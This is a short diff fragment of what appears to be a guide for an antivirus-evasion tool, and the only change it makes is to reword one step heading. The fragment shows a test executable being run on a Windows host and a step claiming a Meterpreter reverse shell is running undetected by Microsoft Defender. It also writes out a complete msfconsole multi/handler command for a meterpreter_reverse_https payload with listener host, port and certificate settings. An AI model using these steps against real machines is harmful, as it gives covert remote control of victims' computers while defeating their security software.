@@ -158,8 +158,8 @@ AntivirusEnabled
 PS C:\Users\Administrator\Downloads> .\HarrietReverseShellTest.exe
 
 
-Step 4 - You have now a meterpreter shell running without being detected nor blocked by the MS Defender AV
-===========================================================================================================
+Step 4 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop without being detected nor blocked by the MS Defender AV
+==============================================================================================================================================
 
 jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443;
 set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;
